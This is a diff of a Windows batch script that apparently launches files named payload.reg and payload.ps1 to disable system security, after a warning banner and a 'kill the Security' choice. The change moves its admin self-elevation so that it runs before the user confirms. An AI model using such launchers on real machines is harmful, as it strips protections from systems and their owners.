@@ -5,6 +5,13 @@ color 04
 :: Get the folder where this batch file is located
 set "basepath=%~dp0"
 
+:: Get administrator permission
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    powershell -Command "Start-Process '%~f0' -Verb RunAs"
+    exit /b
+)
+
 ::   ===================== WARNING BANNER =====================
 echo.
 echo ==========================================================
@@ -29,13 +36,6 @@ if "%choice%"=="1" echo You will kill the Security
 if "%choice%"=="0" exit
 pause
 
-:: Get the administrator permission
-net session >nul 2>&1
-if %errorLevel% neq 0 (
-    powershell -Command "Start-Process '%~f0' -Verb RunAs"
-    exit /b
-)
-
 :: Paths relative to this batch file
 set "payloadreg=%basepath%payload.reg"
 set "payloadps1=%basepath%payload.ps1"
@@ -55,4 +55,5 @@ if exist "%payloadps1%" (
 ) else (
     echo Payload PowerShell not found: %payloadps1%
 )
+
 
